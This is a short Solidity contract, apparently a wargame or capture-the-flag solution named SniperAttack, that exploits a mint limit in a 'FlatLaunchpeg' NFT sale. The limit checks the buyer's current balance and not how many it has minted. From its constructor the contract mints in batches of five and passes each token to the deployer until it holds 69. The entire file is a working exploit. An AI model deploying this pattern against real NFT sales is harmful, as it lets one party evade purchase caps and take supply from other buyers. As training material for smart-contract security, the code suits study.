// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import { FlatLaunchpeg } from "../jpeg-sniper/FlatLaunchpeg.sol";

contract SniperAttack {
    /**
     * Cant mint more than 5
     * Checks for balance of sender isntead of a record of minted tokens
     * */
    constructor(address adr) {
        unchecked {
            FlatLaunchpeg flat = FlatLaunchpeg(adr);
            uint256 id;

            // First 65 NFTs go in this loop (13* 5)
            for (uint256 i; i < 13; ++i) {
                flat.publicSaleMint(5);
                for (uint256 j; j < 5; ++j) {
                    flat.transferFrom(address(this), msg.sender, id);
                    ++id;
                }
            }

            // Last 4 NFTs
            flat.publicSaleMint(4);
            for (uint256 k; k < 4; ++k) {
                flat.transferFrom(address(this), msg.sender, id);
                ++id;
            }
        }
    }
}
